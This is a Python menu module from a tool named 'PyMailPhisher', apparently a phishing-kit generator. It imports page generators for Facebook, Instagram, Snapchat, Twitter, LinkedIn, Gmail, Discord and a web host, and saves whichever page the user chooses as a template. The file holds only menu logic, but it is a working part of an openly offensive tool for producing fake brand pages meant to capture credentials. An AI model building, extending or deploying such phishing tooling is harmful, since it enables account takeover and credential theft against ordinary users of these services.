from Modules.UI import *

from Modules.Parsers.facebook  import  pageGenerator_FB
from Modules.Parsers.instagram import  pageGenerator_IG
from Modules.Parsers.snapchat  import  pageGenerator_SC
from Modules.Parsers.twitter   import  pageGenerator_TW
from Modules.Parsers.linkedIn  import  pageGenerator_LN
from Modules.Parsers.gmail     import  pageGenerator_GM
from Modules.Parsers.discord   import  pageGenerator_DC
from Modules.Parsers.webHost   import  pageGenerator_WH

def generatePages_():
    while True:
        clear()
        banner()
        pagesList()
        choosePage = str(input(style.RESET('PyMailPhisher') + style.GREEN(' >>> ') + style.RESET('')))
        if choosePage == "9":
            clear()
            banner()
            break
        else:
            templates = [pageGenerator_FB, pageGenerator_IG, pageGenerator_TW, pageGenerator_SC, pageGenerator_LN, pageGenerator_GM, pageGenerator_DC, pageGenerator_WH]
            template = int(choosePage) - 1
            templates[template]()
            clear()
            banner()
            print(style.GREEN('[+]') + style.RESET('The page has been generated and saved in Templates/TempTemplates.'))
            input(style.YELLOW('[*]') + style.RESET('Press anything to continue.'))
            break
